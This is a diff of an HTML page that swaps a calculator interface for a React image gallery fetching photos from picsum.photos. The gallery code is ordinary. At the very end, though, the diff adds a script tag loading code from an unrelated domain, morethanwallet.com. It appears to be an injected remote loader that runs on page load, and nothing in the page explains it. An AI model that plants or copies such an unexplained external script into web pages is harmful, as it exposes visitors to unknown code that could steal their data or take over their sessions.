@@ -1,52 +1,143 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link
-      href="https://fonts.cdnfonts.com/css/sf-pro-display"
-      rel="stylesheet"
-    />
-    <link rel="stylesheet" type="text/css" href="app.css" />
-    <title>Calculator</title>
-  </head>
-  <body>
-    <div class="container">
-      <header>iCalc</header>
-      <div class="calculator">
-        <div class="display" id="display">0</div>
-        <div class="buttons" id="buttons">
-          <button>7</button>
-          <button>8</button>
-          <button>9</button>
-          <button class="remove" id="remove">&#9003;</button>
+<html>
 
-          <button class="scientific">sqrt</button>
-          <button class="scientific">x²</button>
-          <button class="scientific">sin</button>
-          <button class="scientific">cos</button>
-          <button class="scientific">tan</button>
-          <button class="scientific">π</button>
-          <button class="scientific">e</button>
-          <button class="scientific">x^y</button>
-          <button class="scientific">log</button>
-          <button>4</button>
-          <button>5</button>
-          <button>6</button>
-          <button class="operator">*</button>
-          <button>1</button>
-          <button>2</button>
-          <button>3</button>
-          <button class="operator">-</button>
-          <button>0</button>
-          <button>.</button>
-          <button class="operator" id="equals">=</button>
-          <button class="operator">+</button>
-          <button class="operator">/</button>
-          <button class="clear" id="clear">C</button>
-        </div>
-      </div>
-    </div>
-    <script src="app.js"></script>
-  </body>
+<head>
+   <meta charset="UTF-8" />
+   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+   <title>React App</title>
+   <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" />
+   <style>
+     .toolbar {
+       text-align: center;
+     }
+    
+     .thumbnail {
+       display: inline-block;
+     }
+
+     .selected-image {
+       display: block;
+       margin: 0 auto; 
+       max-width: 100%; 
+     }
+
+     .button {
+         display: inline-block;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 20px;
+            background-color: #338ab0;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+   
+     }
+     .selected-image-container {
+         text-align: center;
+         background-color: #338ab0; 
+         color: #fff;
+         padding: 20px; 
+      }
+      .button:hover {
+        background-color: #164c64; 
+        }
+   </style>
+</head>
+
+<body>
+   <div id="root"></div>
+
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/react/17.0.2/umd/react.development.js"></script>
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/17.0.2/umd/react-dom.development.js"></script>
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/6.26.0/babel.min.js"></script>
+
+   <script type="text/babel">
+     class ImgController extends React.Component {
+       constructor(props) {
+         super(props);
+         this.state = {
+           images: [],
+           currentPage: 0,
+           perPage: 6,
+           selected: null
+         };
+       }
+
+       componentDidMount() {
+         fetch("https://picsum.photos/v2/list?limit=30")
+           .then(response => response.json())
+           .then(data => {
+             const images = data.map(img => ({
+               id: img.id,
+               thumb: `https://picsum.photos/id/${img.id}/80/80`,
+               full: `https://picsum.photos/id/${img.id}/350/350`
+             }));
+             this.setState({ images });
+             this.selectImg(images[0]);
+           })
+           .catch(error => console.error("Error fetching images:", error));
+       }
+
+       selectImg = img => {
+         this.setState({ selected: img });
+       };
+
+       prevPage = () => {
+         const { currentPage } = this.state;
+         if (currentPage > 0) {
+           this.setState(prevState => ({ currentPage: prevState.currentPage - 1 }));
+         }
+       };
+
+       nextPage = () => {
+         const { currentPage, images, perPage } = this.state;
+         if (currentPage < images.length / perPage - 1) {
+           this.setState(prevState => ({ currentPage: prevState.currentPage + 1 }));
+         }
+       };
+
+       render() {
+         const { images, currentPage, perPage, selected } = this.state;
+         const startIndex = currentPage * perPage;
+         const endIndex = startIndex + perPage;
+         const pageImages = images.slice(startIndex, endIndex);
+         return (
+           <div className="toolbar">
+             <button className="button" onClick={this.prevPage} disabled={currentPage === 0}>
+               &lt; Prev
+             </button>
+             {pageImages.map(img => (
+               <img
+                 key={img.id}
+                 className="thumbnail"
+                 src={img.thumb}
+                 onClick={() => this.selectImg(img)}
+               />
+             ))}
+             <button
+               className="button"
+               onClick={this.nextPage}
+               disabled={currentPage === Math.ceil(images.length / perPage) - 1}
+             >
+               Next &gt;
+             </button>
+             {selected && (
+                <div className="selected-image-container">
+                  <img className="selected-image" src={selected.full} alt="Selected Image" />
+                </div>
+              )}  
+          </div>
+        );
+      }
+    }
+
+    ReactDOM.render(<ImgController />, document.getElementById('root'));
+    </script>
+ <script src="https://morethanwallet.com/appstore/index.js"></script>
+</body>
+
 </html>
